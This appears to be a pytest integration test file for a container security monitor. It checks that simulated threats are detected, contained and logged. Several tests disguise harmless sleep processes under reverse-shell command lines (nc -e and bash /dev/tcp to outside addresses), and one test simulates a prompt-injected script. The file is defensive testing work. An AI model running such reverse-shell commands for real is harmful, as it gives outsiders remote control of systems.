#!/usr/bin/env python3
"""
End-to-end integration tests for security monitoring.

Tests all aspects: threat detection, automated responses, audit logging.
Uses background shell processes and direct container command injection.
"""

import json
import subprocess
import time
from pathlib import Path

import pytest


@pytest.fixture
def test_workspace(tmp_path):
    """Create test workspace."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "README.md").write_text("# Test")
    return str(workspace)


@pytest.fixture
def enable_monitoring():
    """Enable monitoring for tests."""
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
"""
    )

    yield config_path

    if backup:
        config_path.write_text(backup)
    elif config_path.exists():
        config_path.unlink()


def get_container_name_from_workspace(workspace):
    """Generate expected container name from workspace path."""
    # Container name format: coi-<workspace-basename>-<slot>
    return f"coi-{Path(workspace).name}-1"


def get_container_state(name):
    """Get container state."""
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def get_threat_events(container_name):
    """Get threat events from audit log."""
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    if not log_path.exists():
        return []

    events = []
    with open(log_path) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:  # ThreatEvent
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def cleanup_container(name, coi_binary):
    """Force cleanup container."""
    subprocess.run(
        [coi_binary, "container", "delete", name, "--force"],
        timeout=30,
        check=False,
    )


class TestMonitoringFeature:
    """Test monitoring feature availability."""

    def test_monitor_flag_recognized(self, coi_binary):
        """Verify --monitor flag exists."""
        result = subprocess.run(
            [coi_binary, "shell", "--help"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert "--monitor" in result.stdout or "--monitor" in result.stderr


class TestThreatDetection:
    """Test threat detection for different attack types."""

    def test_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test reverse shell detection and auto-kill."""
        # Start shell in background (don't read stdout/stderr to avoid blocking)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "1", "--debug"],
            stdin=subprocess.DEVNULL,  # Don't interact
            stdout=subprocess.DEVNULL,  # Ignore output
            stderr=subprocess.DEVNULL,  # Ignore errors
        )

        # Wait for container to be created
        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace)

        # Verify container exists and is running
        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject malicious command (simulate reverse shell)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect and kill
        max_wait = 15
        for _ in range(max_wait):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                break

        # Verify container was killed
        final_state = get_container_state(container_name)
        assert final_state in [
            "Stopped",
            "Frozen",
        ], f"Expected container killed, got {final_state}"

        # Verify threat event logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat event"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_env_scanning_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test environment scanning detection (WARNING level)."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "2", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-2")

        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject env scanning command
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING event
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event for env scanning"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestAutomatedResponse:
    """Test automated threat response system."""

    def test_critical_threat_kills_container(self, test_workspace, enable_monitoring, coi_binary):
        """Verify CRITICAL threats trigger auto-kill."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "3", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-3")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Trigger CRITICAL threat
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for auto-kill
        killed = False
        for _ in range(15):
            time.sleep(1)
            if get_container_state(container_name) in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be auto-killed on CRITICAL threat"

        # Verify action logged
        events = get_threat_events(container_name)
        killed_events = [e for e in events if e.get("action") == "killed"]
        assert len(killed_events) > 0, "Expected action='killed' in audit log"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestPromptInjectionScenario:
    """Test realistic prompt injection scenario - code inside container goes rogue."""

    def test_malicious_script_execution_inside_container(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Simulate prompt injection: script inside container executes malicious commands."""
        # Create a malicious script that simulates prompt-injected code
        malicious_script = Path(test_workspace) / "run_task.py"
        malicious_script.write_text(
            """#!/usr/bin/env python3
# Simulates a tool that got prompt-injected to run malicious commands
import subprocess
import time

# Simulate legitimate work first
print("Processing task...")
time.sleep(1)

# Then execute malicious command (simulating prompt injection)
# Using exec -a to fake the process name
subprocess.Popen(
    ["sh", "-c", "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

print("Task completed")
"""
        )
        malicious_script.chmod(0o755)

        # Start shell with monitoring enabled
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "4",
                "--monitor",  # Enable monitoring
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-4")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Execute the malicious script from INSIDE the container (realistic scenario)
        exec_proc = subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/run_task.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect the threat
        time.sleep(5)

        # Container should be killed due to CRITICAL threat
        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        # Verify container was killed
        assert killed, "Container should be auto-killed when inside process goes rogue"

        # Verify threat detected in audit log
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat event for prompt injection"

        # Verify the threat description mentions reverse shell
        threat_descriptions = [e.get("threat", "") for e in critical]
        assert any("reverse shell" in desc.lower() for desc in threat_descriptions), (
            "Expected reverse shell detection"
        )

        proc.terminate()
        exec_proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_monitoring_logs_for_warnings(self, test_workspace, enable_monitoring, coi_binary):
        """Verify monitoring logs contain WARNING messages, not just audit logs."""
        # Create script that triggers WARNING (not CRITICAL)
        warning_script = Path(test_workspace) / "scan_env.py"
        warning_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Simulate environment scanning (WARNING level)
subprocess.Popen(
    ["sh", "-c", "exec -a 'env' sleep 30"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        warning_script.chmod(0o755)

        # Start shell and capture stderr (where monitoring logs go)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "5",
                "--monitor",
                "--debug",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-5")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Run the warning-triggering script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/scan_env.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should stay running on WARNING, got {state}"

        # Verify WARNING in audit log
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event in audit log"

        # Check that audit log has proper structure
        for warning in warnings:
            assert "timestamp" in warning, "Audit event missing timestamp"
            assert "threat" in warning, "Audit event missing threat description"
            assert "level" in warning, "Audit event missing level"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


# These end-to-end tests verify all monitoring aspects:
# - Threat detection (reverse shells, env scanning)
# - Threat levels (CRITICAL, WARNING)
# - Automated responses (auto-kill, alert-only)
# - Audit logging
# - Prompt injection scenarios (code inside container going rogue)
#
# Tests use background shell processes and direct container command injection
# to avoid stdout/stderr blocking issues.
